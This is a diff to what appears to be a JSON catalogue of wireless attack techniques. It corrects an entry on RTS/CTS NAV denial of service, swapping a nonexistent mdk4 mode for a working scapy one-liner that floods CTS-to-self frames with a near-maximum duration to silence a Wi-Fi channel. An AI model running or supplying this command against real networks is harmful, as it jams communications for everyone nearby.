@@ -62,17 +62,18 @@
   },
   {
     "id": "dos-mdk4-v-rts-cts-nav",
-    "name": "mdk4 mode v — RTS/CTS NAV DoS",
+    "name": "RTS/CTS NAV DoS (scapy — NOT an mdk4 mode)",
     "category": "dos",
     "region": "universal",
     "era_bounds": ["2011", null],
     "still_effective_2026": true,
     "confidence": "primary",
-    "citations": ["aircrack-ng-docs"],
+    "citations": ["aircrack-ng-docs", "ieee-802-11-2020"],
     "see_also": ["rts-cts-nav-dos", "frame-ctrl-rts", "frame-ctrl-cts"],
     "technical_body": {
-      "cmd": "mdk4 <iface> v",
-      "target": "every neighbor's NAV timer; silences the channel"
+      "cmd": "python3 -c 'from scapy.all import *; sendp(RadioTap()/Dot11(type=1,subtype=12,addr1=my_mac,ID=0x7fff), iface=\"wlan1mon\", loop=1, inter=0.001)'",
+      "note": "mdk4 has no `v` mode — valid mdk4 modes are b/a/p/d/m/e/f/s/w/x/g. NAV-reservation floods are scapy CTS-to-self with Duration/ID near 0x7FFF (32767 μs, the field maximum).",
+      "target": "every neighbor's NAV timer; silences the channel while frames stream"
     }
   },
   {
